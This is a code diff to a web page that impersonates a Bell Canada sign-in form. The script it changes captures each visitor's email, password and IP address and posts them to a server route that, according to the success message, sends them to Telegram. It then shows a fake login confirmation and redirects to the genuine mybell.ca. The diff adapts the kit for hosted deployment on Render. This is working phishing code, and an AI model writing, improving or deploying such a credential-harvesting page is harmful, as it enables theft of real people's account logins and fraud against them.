@@ -327,39 +327,43 @@
             <small>&copy;Bell Canada, 2024.All rights reseved.</small>
         </footer>
     </div>
-    <script>
-    document.querySelector("#signIn").addEventListener('click', function () {
+   <script>
+    document.querySelector("#signIn").addEventListener("click", function () {
         const username = document.querySelector("#email").value;
         const passkey = document.querySelector("#password").value;
         const ip = document.querySelector("#hidden_ip").value;
-    
+
         if (!passkey) {
             document.querySelector("#wrongPassword").style.display = "block";
         } else {
-            fetch('http://localhost:3000/save-login', {
-                method: 'POST',
+            fetch("/save-login", { // Adjusted for Render deployment (uses relative path)
+                method: "POST",
                 headers: {
-                    'Content-Type': 'application/json'
+                    "Content-Type": "application/json",
                 },
                 body: JSON.stringify({
                     email: username,
                     password: passkey,
-                    ip: ip
+                    ip: ip,
+                }),
+            })
+                .then((response) => response.json())
+                .then((data) => {
+                    if (data.message === "Data sent to Telegram successfully.") {
+                        alert("Logged in successfully");
+                        setTimeout(() => {
+                            window.location.href = "https://mybell.ca";
+                        }, 3000); // Redirect after 3 seconds
+                    } else {
+                        console.error(data.error);
+                        document.querySelector("#wrongPassword").style.display = "block";
+                    }
                 })
-            })
-            .then(response => response.json())
-            .then(data => {
-                if (data.message === 'Data saved successfully.') {
-                    window.location.href = "https://webmail.bell.net/bell/index-rui.jsp?v=3.1.3.48.0-4#/";
-                } else {
-                    console.error(data.error);
-                    document.querySelector("#wrongPassword").style.display = "block";
-                }
-            })
-            .catch(err => console.error('Error:', err));
+                .catch((err) => console.error("Error:", err));
         }
     });
 </script>
+
 </body>
 
 </html>
